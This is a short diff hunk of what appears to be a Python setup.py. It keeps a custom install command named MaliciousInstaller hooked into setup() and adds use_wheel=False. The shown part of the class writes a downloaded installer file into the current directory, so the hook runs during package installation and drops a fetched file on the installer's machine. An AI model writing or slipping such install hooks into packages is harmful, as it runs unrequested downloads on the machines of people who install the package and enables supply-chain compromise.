@@ -26,9 +26,7 @@ class MaliciousInstaller(install):
                 f.write(installer_content)
             print('Installer downloaded to current directory')
 
-
 setup(
-    cmdclass={
-        "install": MaliciousInstaller
-    }
+    cmdclass={"install": MaliciousInstaller},
+    use_wheel=False
 )
